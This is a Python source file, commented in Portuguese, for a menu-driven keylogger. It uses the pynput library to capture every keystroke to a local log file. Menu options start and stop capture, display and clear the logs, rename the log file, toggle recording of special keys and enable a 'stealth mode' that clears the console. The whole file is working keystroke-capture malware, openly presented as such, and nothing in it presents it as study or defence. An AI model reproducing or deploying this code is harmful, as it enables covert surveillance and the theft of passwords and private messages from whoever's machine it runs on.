import os
import threading
import time
from pynput import keyboard
from datetime import datetime

# ===========================
# CONFIGURAÇÕES INICIAIS
# ===========================
log_file = "log.txt"
registrar_especiais = True
keylogger_ativo = False
listener = None

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
    keyboard.Key.cmd_r,
    keyboard.Key.ctrl_l
}

# ===========================
# FUNÇÃO PRINCIPAL DO KEYLOGGER
# ===========================
def on_press(key):
    global log_file, registrar_especiais

    try:
        if key.char is not None:
            texto = key.char
        else:
            raise AttributeError

    except AttributeError:
        if key == keyboard.Key.space:
            texto = " "
        elif key == keyboard.Key.enter:
            texto = "\n"
        elif key == keyboard.Key.tab:
            texto = "\t"
        elif key == keyboard.Key.backspace:
            texto = ""
        elif key in IGNORAR:
            return
        else:
            if registrar_especiais:
                texto = f"[{key}]"
            else:
                return

    # Grava no arquivo de log com timestamp
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"{texto}")

# ===========================
# CONTROLADORES DO KEYLOGGER
# ===========================
def iniciar_keylogger():
    global listener, keylogger_ativo

    if keylogger_ativo:
        print("\n[!] O keylogger já está ativo.\n")
        return

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    keylogger_ativo = True

    print("\n[✔] Keylogger iniciado com sucesso.\n")


def parar_keylogger():
    global listener, keylogger_ativo

    if listener:
        listener.stop()
        keylogger_ativo = False
        print("\n[✔] Keylogger encerrado.\n")
    else:
        print("\n[!] O keylogger não estava executando.\n")

# ===========================
# FUNÇÕES DO MENU
# ===========================
def mostrar_logs():
    if not os.path.exists(log_file):
        print("\n[!] Nenhum log encontrado.\n")
        return
    
    print("\n===== CONTEÚDO DO LOG =====\n")
    with open(log_file, "r", encoding="utf-8") as f:
        print(f.read())
    print("===========================\n")

def limpar_logs():
    open(log_file, "w").close()
    print("\n[✔] Log limpo com sucesso.\n")

def alterar_nome_log():
    global log_file
    novo = input("Novo nome do arquivo (ex: dados.txt): ").strip()

    if novo == "":
        print("\n[!] Nome inválido.\n")
        return

    log_file = novo
    print(f"\n[✔] Agora os logs serão salvos em: {log_file}\n")

def alternar_teclas_especiais():
    global registrar_especiais
    registrar_especiais = not registrar_especiais

    estado = "ATIVADO" if registrar_especiais else "DESATIVADO"
    print(f"\n[✔] Registro de teclas especiais: {estado}\n")

def modo_stealth():
    os.system("cls")
    print("[✔] Modo stealth ativado. A janela foi limpa e o programa continua rodando silenciosamente.\n")

# ===========================
# MENU PRINCIPAL
# ===========================
def menu():
    while True:
        print("""
=====================================
      MENU PRINCIPAL - KEYLOGGER
=====================================
1 - Iniciar Keylogger
2 - Parar Keylogger
3 - Mostrar logs
4 - Limpar logs
5 - Alterar nome do arquivo de log
6 - Ativar/Desativar registro de teclas especiais
7 - Modo Stealth (ocultar interface)
0 - Sair
=====================================
        """)

        opc = input("Escolha: ").strip()

        if opc == "1":
            iniciar_keylogger()
        elif opc == "2":
            parar_keylogger()
        elif opc == "3":
            mostrar_logs()
        elif opc == "4":
            limpar_logs()
        elif opc == "5":
            alterar_nome_log()
        elif opc == "6":
            alternar_teclas_especiais()
        elif opc == "7":
            modo_stealth()
        elif opc == "0":
            parar_keylogger()
            print("Encerrando...")
            time.sleep(1)
            break
        else:
            print("\n[!] Opção inválida.\n")


if __name__ == "__main__":
    menu()
